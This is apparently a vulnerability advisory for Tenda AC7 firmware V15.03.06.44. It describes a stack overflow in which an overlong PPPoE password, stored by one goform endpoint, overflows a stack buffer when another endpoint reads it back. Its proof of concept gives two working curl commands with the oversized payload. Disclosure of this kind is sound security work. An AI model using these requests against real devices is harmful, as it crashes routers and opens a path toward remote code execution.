## Overview

Tenda AC7 firmware **V15.03.06.44** contains a stack-overflow vulnerability in the PPPoE fast-setup flow. The `POST /goform/fast_setting_pppoe_set` handler stores an attacker-controlled `password` into the configuration key `wan1.ppoe.pwd` via `SetValue` Function. That key is later retrieved by `GET /goform/fast_setting_get` with `GetValue` Function and copied into a fixed-size stack buffer without adequate bounds checks. Because stored values are not validated for length or content, an overly long `password` can overflow the stack when retrieved — causing crashes and creating a potential vector for remote code execution when combined with other exploitable conditions.

## Affected product & version

- Product: Tenda AC7
- Affected firmware: **V15.03.06.44**
- Vendor download page: https://www.tenda.com.cn/product/download/AC7.html

## Vulnerability details

- **Write endpoint:** `POST /goform/fast_setting_pppoe_set`

  - Reads POST parameter `password` into a local buffer `v3`.
  - Persists it with `SetValue("wan1.ppoe.pwd", v3)`.

  ![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251005_142231.png)

- **Read endpoint:** `GET /goform/fast_setting_get`

  - Calls `GetValue("wan1.ppoe.pwd", v32)` to retrieve the stored value into a fixed-size stack buffer `v32`.

  ![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251005_142802.png)

- **Root cause:** `SetValue`/`GetValue` lack input length/content validation and downstream code performing the retrieval assumes the stored value fits into `v32`. This allows a stored value larger than `v32` to overflow the stack on retrieval.

## Poc

1. Send a POST to `/goform/fast_setting_pppoe_set` with a malicious `password` payload

```bash
curl -s -X POST \
  http://192.168.0.1/goform/fast_setting_pppoe_set \
  -d 'username=adm' \
  -d 'password=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
```

2. Trigger Stack Overflow Vulnerability through the `/goform/fast_setting_get` interface.

```bash
curl -s -X POST \
  http://192.168.0.1/goform/fast_setting_get
```

3. Successfully triggered attack

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251005_091337.png)